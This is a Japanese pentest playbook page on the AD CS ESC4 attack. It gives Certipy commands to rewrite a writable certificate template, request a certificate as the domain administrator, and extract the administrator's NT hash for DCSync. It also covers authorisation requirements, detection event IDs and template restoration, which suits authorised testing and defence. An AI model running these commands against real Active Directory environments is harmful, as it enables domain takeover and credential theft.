# ESC4 — テンプレートオブジェクトへの過剰な Write ACL

> **スコープ**: 低権限ユーザーがテンプレートオブジェクトに Write 権限を持つ場合に、テンプレートを ESC1 化（`ENROLLEE_SUPPLIES_SUBJECT` + Client Auth を付与）して証明書発行〜DCSync まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 不可逆な設定変更を含む（テンプレート設定の変更は CA 全体に影響。元に戻す手順が必要）
> - [x] 持続化に該当（変更後のテンプレートから発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4662・MDI アラート）
> - [ ] 業務停止リスク（テンプレート変更は他ユーザーの証明書申請に影響する可能性あり）
>
> 実施可否は事前合意で明示確認すること。テンプレート設定は原状回復が必須。演習環境では制約なし。

## 着火条件

- Certipy の出力で対象テンプレートに `[!] Vulnerabilities: ESC4` が表示されている
- または `Object Control Permissions` に低権限ユーザーが `Write Owner Principals` / `Write Dacl Principals` / `Write Property Principals` / `GenericAll` / `GenericWrite` のいずれかを持つ

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `certipy`（`pip install certipy-ad --break-system-packages`）

## 先に確認すること

**攻撃者の思考トレース:** テンプレートオブジェクトへの Write 権限は「テンプレートの設定を変えて ESC1 の条件を作り出す」ことを意味する。元々は安全な設定でも、書き込み権限があれば `ENROLLEE_SUPPLIES_SUBJECT` フラグを付与し Client Auth EKU を追加して ESC1 化できる。変更後は**すみやかに証明書を取得して元に戻す**。

---

## 1. テンプレート ACL の確認

**コマンド:**

```bash
# [Attacker] 脆弱テンプレートの列挙
certipy find -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -vulnerable -stdout
```

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| `Write Property Principals` / `Write Dacl Principals` に自グループ | 直接テンプレートを変更できる → §2 へ |
| `Write Owner Principals` に自グループのみ | オーナーを自分に変更してから Write Property を付与する |
| `GenericAll` / `GenericWrite` に自グループ | 最上位の権限 → §2 へ |

---

## 2. 変更前のテンプレート設定をバックアップ（必須）

```bash
# [Attacker] 変更前の状態を JSON に保存（原状回復のリファレンス）
certipy find -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -output [OUTPUT_PREFIX]_before
# → [OUTPUT_PREFIX]_before.json に変更前の全設定が記録される
```

---

## 3. テンプレートを ESC1 化（ENROLLEE_SUPPLIES_SUBJECT + Client Auth を付与）

**コマンド:**

```bash
# [Attacker] テンプレートの設定を上書き（ESC1 条件を書き込む）
certipy template \
  -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] \
  -template [VULNERABLE_TEMPLATE] \
  -save-old
# -save-old: 変更前の設定を [VULNERABLE_TEMPLATE].json に保存（原状回復用）
# → テンプレートに ENROLLEE_SUPPLIES_SUBJECT フラグと Client Auth EKU が設定される
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| テンプレート変更が完了 | ESC1 化成功 | §4 証明書申請へ |
| `ACCESS_DENIED` | Write 権限がない | BloodHound で `WritePKIEnrollmentFlag` / `WritePKINameFlag` エッジを確認 |
| 変更が反映されない | AD のレプリケーション遅延 | 数分待ってから `certipy find` で再確認 |

---

## 4. 変更後のテンプレートで証明書申請〜DCSync

**コマンド（ESC1 手順と同一）:**

```bash
# [Attacker] 任意の UPN で証明書申請
certipy req -ca [CA_NAME] -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -upn administrator@[DOMAIN]
# → administrator.pfx が生成される

# [Attacker] PKINIT 認証 → NT ハッシュ取得
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]
```

詳細フロー → `ESC1.md`（§3・§4 と同一）

---

## 5. テンプレートを元の設定に戻す（原状回復・必須）

```bash
# [Attacker] テンプレート設定を元に戻す（-save-old で保存したファイルから復元）
certipy template \
  -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] \
  -template [VULNERABLE_TEMPLATE] \
  -configuration [VULNERABLE_TEMPLATE].json
```

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| `certipy template` が `ACCESS_DENIED` | BloodHound で `WritePKIEnrollmentFlag` / `WritePKINameFlag` エッジを確認 |
| テンプレートを ESC1 化したが証明書申請が `MANAGER_APPROVAL` | `Requires Manager Approval` フラグも False に変更する（`certipy template` で対応可能）|
| `-save-old` で保存した JSON がない | `certipy find` の変更前出力を使って手動で属性値を確認し、`Set-AdObject` で復元（Windows 端末要）|

---

## 注意点・落とし穴

- **`-save-old` は必ず使う**: 変更前の設定が失われると原状回復が難しくなる
- **テンプレートの変更は CA 全体に影響する**: 変更したテンプレートを使っている他のユーザー・サービスの証明書申請挙動が変わる可能性がある
- **変更後はすみやかに証明書を取得してテンプレートを元に戻す**: 変更した状態を長時間放置しない

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。テンプレート設定変更は CA 全体への影響があり個別合意が必要
- **想定されるSIEM/EDR検知**: Event ID 4662（証明書テンプレートオブジェクト変更）/ 4886・4887（証明書発行）/ MDI「疑わしいテンプレート変更」
- **業務影響リスク**: テンプレート変更により他ユーザーの証明書申請に影響する可能性あり
- **原状回復必須項目**: ✅ テンプレートを元の設定に戻す（§5 の `-configuration` で復元）/ ✅ 発行した証明書を CA で失効 / ✅ pfx・NT ハッシュ・TGT の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：テンプレート変更後の ESC1 手順 → `ESC1.md`
- 前：ACL 悪用の一般手法 → `../ACE_Abuse/GenericAll.md` / `../ACE_Abuse/WriteDACL.md`
- 後：テンプレート ESC1 化後の証明書取得 → PKINIT → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
